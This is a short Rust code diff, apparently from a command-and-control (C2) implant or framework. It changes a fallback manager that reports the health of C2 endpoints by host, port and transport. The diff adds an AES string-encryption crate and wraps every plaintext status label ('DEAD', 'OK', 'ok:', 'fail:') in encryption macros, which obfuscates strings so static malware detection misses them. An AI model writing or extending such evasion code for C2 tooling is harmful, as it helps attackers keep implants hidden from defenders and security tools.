@@ -11,6 +11,8 @@
 
 use std::time::Instant;
 use rand::Rng;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 use crate::common::{
     C2Config, FallbackEndpoint, FallbackStrategy,
@@ -163,12 +165,12 @@ impl FallbackManager {
     /// Get a summary of endpoint health for diagnostics.
     pub fn status_summary(&self) -> String {
         self.states.iter().enumerate().map(|(i, s)| {
-            let status = if s.is_dead(self.dead_time_secs) { "DEAD" }
-                else if s.consecutive_failures > 0 { "DEGRADED" }
-                else { "OK" };
-            format!("[{}] {}:{} ({:?}) — {} (ok:{} fail:{})",
+            let status = if s.is_dead(self.dead_time_secs) { aes_str!("DEAD") }
+                else if s.consecutive_failures > 0 { aes_str!("DEGRADED") }
+                else { aes_str!("OK") };
+            format!("[{}] {}:{} ({:?}) — {} ({}{} {}{})",
                 i, s.endpoint.host, s.endpoint.port, s.endpoint.transport,
-                status, s.total_successes, s.total_failures)
+                status, aes_str!("ok:"), s.total_successes, aes_str!("fail:"), s.total_failures)
         }).collect::<Vec<_>>().join("\n")
     }
 
